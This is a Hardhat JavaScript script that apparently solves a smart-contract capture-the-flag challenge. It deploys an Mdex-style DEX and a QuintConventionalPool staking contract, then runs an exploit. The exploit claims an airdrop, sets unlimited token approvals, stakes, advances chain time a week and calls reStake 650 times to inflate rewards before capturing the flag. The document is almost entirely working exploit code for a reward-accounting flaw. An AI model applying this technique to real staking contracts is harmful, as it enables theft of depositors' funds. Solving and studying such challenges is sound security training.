const { ethers } = require("hardhat");
const { address } = require("hardhat/internal/core/config/config-validation");
const { expect } = require("chai");

async function deploy(deployer) {
  const MdexFactory = await ethers.getContractFactory("MdexFactory", deployer);
  const factory = await MdexFactory.deploy(deployer.address);
  console.log("factory contract:", factory.address);
  await factory.connect(deployer).setInitCodeHash(factory.getInitCodeHash());
  console.log("factory contract initialize success!");
  const WHT = await ethers.getContractFactory("WHT", deployer);
  const wht = await WHT.deploy();
  const MdexRouter = await ethers.getContractFactory("MdexRouter", deployer);
  const router = await MdexRouter.deploy(factory.address, wht.address);
  console.log("router contract:", router.address);
  const Deploy = await ethers.getContractFactory("deploy", deployer);
  const deploy = await Deploy.deploy(factory.address, router.address);
  console.log("deploy contract:", deploy.address);
  await deploy.connect(deployer).Step1();
  await deploy.connect(deployer).step2();

  return deploy;
}

async function exploit(deploy, attacker) {
  deploy.connect(attacker).airdrop();
  const MdexPair = await ethers.getContractFactory(
    "contracts/challenge9/factory.sol:MdexPair"
  );
  const mdxPair = await MdexPair.attach(await deploy.pair());
  const QuintConventionalPool = await ethers.getContractFactory(
    "QuintConventionalPool"
  );
  const quintConventionalPool = await QuintConventionalPool.attach(
    await deploy.quintADDRESS()
  );
  await mdxPair
    .connect(attacker)
    .approve(
      quintConventionalPool.address,
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    );
  await deploy
    .connect(attacker)
    .approve(
      quintConventionalPool.address,
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    );
  await quintConventionalPool
    .connect(attacker)
    .stake("100000000000000000000000", 0);
  await quintConventionalPool
    .connect(attacker)
    .stake("99999999999999999999000", 1);
  await hre.network.provider.send("evm_increaseTime", [3600 * 24 * 7]);
  for (var i = 0; i < 650; i++) {
    // await hre.network.provider.send("evm_increaseTime", [3600]);
    quintConventionalPool.connect(attacker).reStake(1);
  }
  await expect(quintConventionalPool.connect(attacker).captureFlag())
    .to.emit(quintConventionalPool, "flag")
    .withArgs("succese", attacker.address);
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let _deploy = await deploy(deployer);

  await exploit(_deploy, attacker);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
